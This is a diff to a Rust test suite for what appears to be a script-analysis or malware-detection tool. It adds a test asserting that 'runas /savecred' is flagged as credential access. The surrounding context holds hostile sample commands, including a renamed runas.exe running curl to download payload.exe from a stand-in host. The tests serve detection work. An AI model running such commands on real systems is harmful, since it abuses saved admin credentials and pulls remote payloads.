@@ -1948,6 +1948,32 @@ start payload.chm"#;
     }
 
     #[test]
+    fn runas_savecred_emits_credential_access_trait() {
+        let script = br#"runas /savecred /user:Administrator "cmd.exe /c whoami""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CredentialAccess { technique, target }
+                    if technique == "runas-savecred" && target.contains("/savecred")
+            )),
+            "runas /savecred was not surfaced as credential access: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args.as_deref().is_some_and(|value| value.contains("whoami"))
+            )),
+            "runas /savecred should still emit SelfElevation: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_runas_alias_replays_quoted_child_command() {
         let script = br#"copy C:\Windows\System32\runas.exe C:\Users\Public\ra.tmp
 C:\Users\Public\ra.tmp /user:Administrator "cmd.exe /c curl -o out.exe https://copied-runas.example/payload.exe""#;
